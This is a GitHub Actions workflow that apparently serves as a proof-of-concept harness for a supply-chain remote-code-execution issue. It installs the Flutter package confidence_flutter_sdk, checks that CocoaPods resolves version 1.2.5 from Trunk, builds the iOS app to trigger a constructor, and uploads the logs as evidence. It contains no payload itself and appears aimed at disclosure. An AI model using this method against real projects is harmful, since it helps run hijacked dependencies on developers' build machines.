name: Supply Chain RCE Proof of Concept
on: [push, workflow_dispatch]

jobs:
  poc:
    runs-on: macos-latest
    steps:
      - name: Setup Flutter
        uses: subosito/flutter-action@v2
        with:
          channel: 'stable'

      - name: Execute Full RCE Chain
        run: |
          # 1. Create dummy project
          flutter create rce_test
          cd rce_test
          
          # 2. Patch iOS deployment target (iOS 16.0 biar aman)
          sed -i '' "s/# platform :ios, '12.0'/platform :ios, '16.0'/" ios/Podfile
          
          # 3. Add package (Official Instruction)
          flutter pub add confidence_flutter_sdk
          
          # 4. Pod Install & Resolution Check
          cd ios
          pod repo update
          pod install --verbose 2>&1 | tee pod_install.log
          
          echo "=== VERIFYING RESOLUTION ==="
          if grep -q "Installing confidence_flutter_sdk 1.2.5" pod_install.log; then
            echo "✅ SUCCESS: Version 1.2.5 (Trunk) was pulled!"
          else
            echo "❌ FAILED: Version 1.2.5 not found in logs."
          fi
          
          echo "=== Podfile.lock Content ==="
          cat Podfile.lock
          
          # 5. Build to trigger constructor execution
          cd ..
          flutter build ios --no-codesign 2>&1 | tee build.log
          
          echo "=== BUILD STATUS ==="
          tail -n 20 build.log

      - name: Upload Logs as Artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: poc-evidence
          path: |
            rce_test/ios/pod_install.log
            rce_test/ios/Podfile.lock
            rce_test/build.log
